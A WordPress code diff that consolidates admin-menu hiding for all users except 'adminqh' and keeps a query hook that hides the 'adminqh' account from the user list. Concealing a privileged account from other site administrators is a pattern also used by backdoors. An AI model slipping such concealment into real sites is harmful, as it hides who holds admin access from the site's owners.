@@ -39,7 +39,7 @@ add_action('admin_bar_menu', 'remove_wp_logo', 999);
  * Hide Menu Page If User Not adminqh
 **/
 function remove_menus() {
-	global $current_user, $sh_option;
+	global $current_user, $sh_option, $submenu;
 	$username = $current_user->user_login;
 	if( $sh_option['btn-restrict-user'] && ( $username != 'adminqh' ) ) {
 		remove_menu_page( 'plugins.php' );
@@ -48,29 +48,21 @@ function remove_menus() {
 	 	remove_menu_page( 'edit-comments.php' );
 	 	remove_menu_page( 'edit.php?post_type=acf-field-group' );
     	remove_menu_page( 'wpcf7' );
+    	unset( $submenu['index.php'][10] );
+	    unset( $submenu['themes.php'][5] );
+	    unset( $submenu['themes.php'][20] );
+	    unset( $submenu['themes.php'][22] );
 	}
 }
 add_action( 'admin_menu', 'remove_menus', 999 );
-
-function remove_unnecessary_wordpress_menus(){
-	global $current_user, $submenu, $sh_option;
-	$username = $current_user->user_login;
-	if ( $sh_option['btn-restrict-user'] && ( $username != 'adminqh' ) ) {
-		unset($submenu['index.php'][10]);
-	    unset($submenu['themes.php'][5]);
-	    unset($submenu['themes.php'][20]);
-	    unset($submenu['themes.php'][22]);
-	}
-}
-add_action('admin_menu', 'remove_unnecessary_wordpress_menus', 999);
 
 function yoursite_pre_user_query($user_search) {
 	global $current_user;
 	$username = $current_user->user_login;
 	if ( $username != 'adminqh' ) {
 		global $wpdb;
-		$user_search->query_where = str_replace('WHERE 1=1',
-		"WHERE 1=1 AND {$wpdb->users}.user_login != 'adminqh'",$user_search->query_where);
+		$user_search->query_where = str_replace( 'WHERE 1=1',
+		"WHERE 1=1 AND {$wpdb->users}.user_login != 'adminqh'",$user_search->query_where );
 	}
 }
 add_action('pre_user_query','yoursite_pre_user_query');
